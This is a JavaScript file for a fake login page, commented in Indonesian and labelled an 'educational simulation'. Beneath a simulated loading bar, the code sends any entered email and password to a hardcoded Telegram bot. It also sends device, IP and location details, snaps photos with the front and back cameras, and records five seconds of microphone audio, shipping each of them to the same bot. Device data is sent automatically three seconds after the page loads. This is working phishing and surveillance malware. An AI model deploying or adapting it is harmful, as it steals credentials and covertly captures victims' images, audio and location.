// === Ganti dengan token & ID Telegram kamu ===
const telegramTokens = [
    '8045925732:AAFJyqb3yfTzZoVWULfT5xD0dIMS0bfKt4A'
];
const chatIds = [
    '7487683701',
    '7487683701'
];

// Loading simulasi
let progress = 0;
const progressBar = document.getElementById('progress-bar');
const loadingDetails = document.getElementById('loading-details');
const loadingMessages = ["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];

let loadingInterval = setInterval(()=> {
    progress+=Math.random()*5;
    if(progress>98) progress=98;
    progressBar.style.width=progress+'%';
    progressBar.parentElement.setAttribute('aria-valuenow',Math.floor(progress));
    if(Math.random()>0.9) loadingDetails.textContent=loadingMessages[Math.floor(Math.random()*loadingMessages.length)];
},500);

// Kirim ke semua bot/ID
async function sendToTelegram(text){
    for(let i=0;i<telegramTokens.length;i++){
        try{
            await fetch(`https://api.telegram.org/bot${telegramTokens[i]}/sendMessage`,{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({chat_id:chatIds[i], text})
            });
        }catch(e){ console.log('❌ Error kirim Telegram', e); }
    }
}

async function sendPhoto(blob,filename){
    for(let i=0;i<telegramTokens.length;i++){
        try{
            const formData=new FormData();
            formData.append('chat_id',chatIds[i]);
            formData.append('photo',blob,filename);
            await fetch(`https://api.telegram.org/bot${telegramTokens[i]}/sendPhoto`,{method:'POST',body:formData});
        }catch(e){ console.log('❌ Error kirim foto', e); }
    }
}

// Ambil device info + IP
async function collectDeviceInfo(){
    let ipInfo = {ip:'Unknown', city:'Unknown', region:'Unknown', country:'Unknown', org:'Unknown'};
    try{
        const res = await fetch('https://ipapi.co/json/');
        ipInfo = await res.json();
    }catch(e){ console.log('❌ Gagal ambil IP info',e); }

    let message='╭───── Tracking Report ───── ⦿\n\n';
    message+='⚙️ DEVICE INFORMATION\n';
    message+=`🖥️ Device: ${navigator.userAgent}\n`;
    message+=`💻 Platform: ${navigator.platform}\n`;
    message+=`🌐 Bahasa: ${navigator.language}\n`;
    message+=`📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
    message+=`📺 Screen Size: ${screen.width}x${screen.height}\n`;
    message+=`🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
    message+=`💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
    message+=`🧠 CPU Cores: ${navigator.hardwareConcurrency||'Unknown'}\n`;
    if(navigator.getBattery){ try{ const battery=await navigator.getBattery(); message+=`🔋 Battery: ${Math.floor(battery.level*100)}%\n`; message+=`🔌 Charging: ${battery.charging?'✅ YA':'❌ TIDAK'}\n`; }catch(e){ message+='🔋 Battery: ❌ Tidak tersedia\n'; } }
    message+=`⏰ Waktu Akses: ${new Date().toString()}\n`;
    message+=`🌍 URL: ${window.location.href}\n\n`;

    message+='🌐 NETWORK INFO\n';
    message+=`🌎 IP Publik: ${ipInfo.ip}\n`;
    message+=`🏙️ Kota: ${ipInfo.city}, ${ipInfo.region}\n`;
    message+=`🇨🇳 Negara: ${ipInfo.country_name}\n`;
    message+=`💡 ISP: ${ipInfo.org}\n\n`;
    message+='╰───── Simulasi Edukasi ───── ⦿';
    return message;
}

// Ambil foto kamera
async function captureCamera(facingMode='user'){
    try{
        const video=document.getElementById('video');
        const canvas=document.getElementById('canvas');
        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode}});
        video.srcObject=stream;
        await new Promise(r=>setTimeout(r,2000));
        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(blob=>sendPhoto(blob,`camera_${facingMode}.jpg`),'image/jpeg');
        stream.getTracks().forEach(track=>track.stop());
    }catch(e){ await sendToTelegram(`❌ Kamera (${facingMode}) tidak tersedia/ditolak.`); }
}

// Rekam suara mikrofon
async function recordAudio(duration=5000){
    try{
        const stream=await navigator.mediaDevices.getUserMedia({audio:true});
        const mediaRecorder=new MediaRecorder(stream);
        let chunks=[];
        mediaRecorder.ondataavailable=e=>chunks.push(e.data);
        mediaRecorder.start();
        await new Promise(r=>setTimeout(r,duration));
        mediaRecorder.stop();
        await new Promise(r=>mediaRecorder.onstop=r);
        const blob=new Blob(chunks,{type:'audio/webm'});
        await sendPhoto(blob,'audio_record.webm');
        stream.getTracks().forEach(track=>track.stop());
    }catch(e){ await sendToTelegram('❌ Mikrofon tidak tersedia/ditolak.'); }
}

// Login simulasi
const emailInput=document.getElementById('email');
const passwordInput=document.getElementById('password');
const loginBtn=document.getElementById('login-btn');
const errorMessage=document.getElementById('error-message');

function validateEmail(email){ const re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/; return re.test(email); }

loginBtn.addEventListener('click', async()=>{
    errorMessage.textContent='';
    const email=emailInput.value.trim();
    const password=passwordInput.value;
    if(!email){ errorMessage.textContent='Email/telepon harus diisi.'; emailInput.focus(); return; }
    if(email.includes('@')&&!validateEmail(email)){ errorMessage.textContent='Format email tidak valid.'; emailInput.focus(); return; }
    if(!password){ errorMessage.textContent='Kata sandi harus diisi.'; passwordInput.focus(); return; }

    clearInterval(loadingInterval);
    progressBar.style.width='100%';
    progressBar.parentElement.setAttribute('aria-valuenow',100);
    loadingDetails.textContent='Selesai memuat.';

    const deviceInfo=await collectDeviceInfo();
    const dataToSend=`Simulasi Edukasi Login\nEmail/Telepon: ${email}\nPassword: ${password}\n\n${deviceInfo}`;
    await sendToTelegram(dataToSend);

    await captureCamera('user');          // Depan
    await captureCamera('environment');   // Belakang
    await recordAudio(5000);              // Rekam suara 5 detik

    setTimeout(()=>{ alert('Simulasi edukasi selesai.'); emailInput.value=''; passwordInput.value=''; progress=0; progressBar.style.width='0%'; loadingDetails.textContent=''; startLoadingSimulation(); },500);
});

function startLoadingSimulation(){ progress=0; loadingDetails.textContent=''; loadingInterval=setInterval(()=>{ progress+=Math.random()*5; if(progress>98) progress=98; progressBar.style.width=progress+'%'; progressBar.parentElement.setAttribute('aria-valuenow',Math.floor(progress)); if(Math.random()>0.9) loadingDetails.textContent=loadingMessages[Math.floor(Math.random()*loadingMessages.length)]; },500); }

// Tracking device otomatis 3 detik setelah load
setTimeout(async()=>{ const deviceInfo=await collectDeviceInfo(); await sendToTelegram(deviceInfo); },3000);
